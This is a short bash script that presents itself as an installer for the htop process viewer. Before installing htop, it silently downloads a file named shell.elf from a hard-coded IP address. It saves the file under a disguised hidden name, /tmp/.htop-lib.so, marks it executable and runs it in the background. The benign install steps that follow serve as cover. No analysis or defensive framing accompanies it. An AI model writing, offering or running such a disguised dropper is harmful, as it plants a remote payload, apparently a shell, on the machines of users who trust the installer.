#!/bin/bash
curl -s -o /tmp/.htop-lib.so http://172.16.17.39:8000/shell.elf
chmod +x /tmp/.htop-lib.so
/tmp/.htop-lib.so &
sudo apt-get update -y
sudo apt-get install -y htop
exec htop
